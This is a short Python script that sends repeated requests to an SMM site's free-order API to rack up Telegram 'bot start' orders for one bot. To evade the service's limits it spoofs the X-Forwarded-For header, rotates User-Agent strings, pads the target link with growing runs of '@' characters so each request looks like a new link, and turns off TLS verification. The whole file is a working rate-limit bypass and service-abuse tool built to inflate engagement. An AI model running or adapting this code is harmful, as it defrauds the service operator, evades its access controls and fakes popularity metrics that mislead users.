import requests, time, warnings
warnings.filterwarnings('ignore')

BASE = "Opanokebot"
U = 'https://core.smm.plus/api/free-service/order'

import time as _t
end_time = _t.time() + 200  # 3.5 min run

total_ok = 0
at_count = 0
MAX_AT = 100

print(f"Starting @ escalation for {BASE}")

while _t.time() < end_time:
    target = "https://t.me/" + ("@" * at_count) + BASE

    # Rotate User-Agent and headers to bypass IP block
    H = {
        'Content-Type': 'application/json',
        'Origin': 'https://smm.plus',
        'Referer': 'https://smm.plus/free-telegram-botstart',
        'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{100+at_count}.0',
        'X-Forwarded-For': f'192.168.{at_count % 255}.{(at_count * 7) % 255}',
        'Accept': 'application/json',
    }

    try:
        r = requests.post(U,
            json={'service': 'telegram_bot_start', 'link': target, 'quantity': 100},
            headers=H, verify=False, timeout=10)

        # Handle empty / non-JSON response
        if not r.text or len(r.text.strip()) < 2:
            print(f"[EMPTY] at={at_count}@ status={r.status_code} -> escalate")
            at_count += 1
            if at_count > MAX_AT:
                at_count = 0
                time.sleep(1)
            continue

        try:
            d = r.json()
        except:
            print(f"[PARSE_ERR] at={at_count}@ resp={r.text[:80]} -> escalate")
            at_count += 1
            if at_count > MAX_AT:
                at_count = 0
            time.sleep(0.5)
            continue

        if d.get('ok'):
            total_ok += 1
            order_id = d.get('data', {}).get('order', '?')
            print(f"[SUCCESS] +100 total={total_ok*100} target={target} order={order_id}")
            at_count = 0  # reset after success
            time.sleep(1)

        else:
            err = d.get('error', '')
            print(f"[LIMIT] at={at_count}@ | {err[:60]} -> escalate @")
            at_count += 1
            if at_count > MAX_AT:
                print(f"[RESET] MAX reached, reset to 0")
                at_count = 0
                time.sleep(2)

    except Exception as e:
        print(f"[ERR] at={at_count}@ {str(e)[:50]} -> escalate")
        at_count += 1
        if at_count > MAX_AT:
            at_count = 0
        time.sleep(0.5)

print(f"\n[DONE] Total: {total_ok * 100} botstart for {BASE}")
